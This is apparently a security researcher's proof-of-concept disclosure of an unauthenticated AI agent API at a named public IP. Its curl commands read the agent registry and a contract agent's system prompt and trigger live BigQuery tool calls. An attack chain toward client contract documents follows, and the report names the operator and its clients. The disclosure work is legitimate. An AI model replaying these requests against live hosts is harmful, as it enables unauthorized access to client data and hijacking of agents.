Proof of Concept: 34.57.75.173 — Unauthenticated Agno AgentOS API
AIRIAD Risk Advisor
NuClide Research | 2026-05-28
================================================================================

SUMMARY
-------
Agno v2.6.1 AgentOS API on :7777 and Next.js Agent UI on :3000 are fully
unauthenticated. Five production agents and one team pipeline are invocable
without credentials. ContractAgent connects live to BigQuery, Google Drive,
and GCS — four client projects confirmed in the registry. Live BigQuery
invocation executed during verification. System prompts readable in full.

SCREENSHOTS
-----------
[PENDING] api-01-registry.png     Port 7777 /registry — full agent fleet
[PENDING] api-02-contractagent.png GET /agents/contractagent — config + system prompt
[PENDING] api-03-bigquery-run.png  Live ContractAgent invocation — BigQuery confirmed
[PENDING] ui-01-port3000.png       Port 3000 Agent UI — no auth prompt


POC 1: Agent registry accessible without auth
---------------------------------------------
Demonstrates: all five agents and team readable in one request.

  curl -s http://34.57.75.173:7777/registry

Expected output:
  {
    "data": [
      { "id": "advisoragent", "type": "agent", ... },
      { "id": "callsagent",   "type": "agent", ... },
      { "id": "contractagent","type": "agent", ... },
      { "id": "deliveryagent","type": "agent", ... },
      { "id": "emailsagent",  "type": "agent", ... },
      { "id": "airiad-risk-advisor", "type": "team", ... }
    ]
  }


POC 2: Full ContractAgent config readable — system prompt exposed
-----------------------------------------------------------------
Demonstrates: system prompt, model, and all tool definitions returned
without credentials.

  curl -s http://34.57.75.173:7777/agents/contractagent

Expected output:
  {
    "id": "contractagent",
    "model": { "model": "gemini-3.1-pro-preview-customtools", "provider": "Google" },
    "tools": {
      "tools": [
        { "name": "get_sow_document",  ... "project_name" required },
        { "name": "save_report",       ... writes to analysis_reports/ },
        { "name": "convert_to_pdf",    ... runs Playwright on host }
      ]
    },
    "system_message": {
      "instructions": [ <full 20-instruction production system prompt> ]
    }
  }

Dev note confirmed at instructions[8]:
  "get_sow_document loads sanitized scope documents from the BigQuery
   documents registry and pulls file bodies from the registered backend
   (Google Drive or GCS) when credentials allow..."


POC 3: Agent UI accessible without auth
---------------------------------------
Demonstrates: port 3000 serves Agno chat UI with no login prompt.

  curl -s -o /dev/null -w "%{http_code}" http://34.57.75.173:3000/

Expected output:
  200


POC 4: Live ContractAgent invocation — BigQuery tool call confirmed
-------------------------------------------------------------------
Demonstrates: agent invocation structure and confirmed execution.
This run was executed during verification. Four client projects confirmed
in BigQuery registry: Marriage Relationship App, AIRIAD, Amika, Avatarmy.

  curl -s -X POST http://34.57.75.173:7777/agents/contractagent/runs \
    -H "Content-Type: application/json" \
    -d '{"message": "list_reporting_projects"}'

BigQuery tool call executed. Client project list returned.
Chain stopped here — no contract document bodies requested.


ATTACK CHAIN (not fully executed)
-----------------------------------
Step 1: GET http://34.57.75.173:7777/registry
        → Full agent fleet + team confirmed
Step 2: GET http://34.57.75.173:7777/agents/contractagent
        → System prompt, BigQuery backend, tool surface exposed
Step 3: POST /agents/contractagent/runs {"message": "list_reporting_projects"}
        → BigQuery list_reporting_projects tool call executes
        → Client project registry returned (confirmed at this step)
Step 4: POST /agents/contractagent/runs {"message": "get_sow_document for Avatarmy"}
        → BigQuery documents registry queried for Avatarmy SOW/CR/BRD
        → Contract document body pulled from Drive or GCS
Step 5: POST /teams/airiad-risk-advisor/runs with crafted project context
        → Full 5-agent pipeline executes against fabricated inputs
        → AdvisorAgent triggers Playwright PDF render on host

Chain stopped at Step 3 verification. No document bodies requested.
No exfiltration. No fabricated data submitted to the pipeline.


CVSS v3.1
---------
  AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:N
  Score: 9.1 Critical

  C:H — client contract data (SOW, CRs, BRDs) readable via agent invocation
  I:H — arbitrary agent instructions accepted; Playwright exec reachable
        via convert_to_pdf in standard agent workflow
  A:N — no availability impact demonstrated


CWE
---
CWE-306: Missing Authentication for Critical Function (AgentOS API)
CWE-359: Exposure of Private Personal Information (client contract data)
CWE-615: Sensitive Information in Source Code (dev notes in system prompt)


================================================================================
Severity: CRITICAL
Exploitable today: YES (POCs 1-3 confirmed, zero credentials)
Operator: AIRIAD (stealth/pre-launch, no public registration)
Clients at risk: Marriage Relationship App | Amika | Avatarmy | AIRIAD
Data class: Client business data — project contracts, SOW, CRs, BRDs
Ethical stop: applied — BigQuery invocation confirmed, no data exfiltrated
================================================================================
